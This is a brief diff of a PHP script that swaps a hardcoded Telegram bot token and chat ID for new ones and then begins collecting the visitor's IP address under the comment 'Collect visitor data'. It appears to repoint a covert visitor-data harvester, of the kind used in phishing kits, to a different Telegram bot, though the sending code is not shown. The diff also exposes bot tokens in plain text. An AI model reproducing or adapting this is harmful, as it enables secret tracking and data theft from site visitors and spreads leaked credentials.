@@ -1,7 +1,7 @@
 <?php
 // Telegram Configuration
-$botToken = '5842558909:AAETb7SiBfb9O9N_SAxe9UK0S_f4xPcGTPQ';
-$chatID = '5533797694';
+$botToken = '9002822623:AAG-5eWw_AB9XyTfcBE8JDEbsvzQwnVqEU4';
+$chatID = '7842482928';
 
 // Collect visitor data
 $ip = $_SERVER['REMOTE_ADDR'];
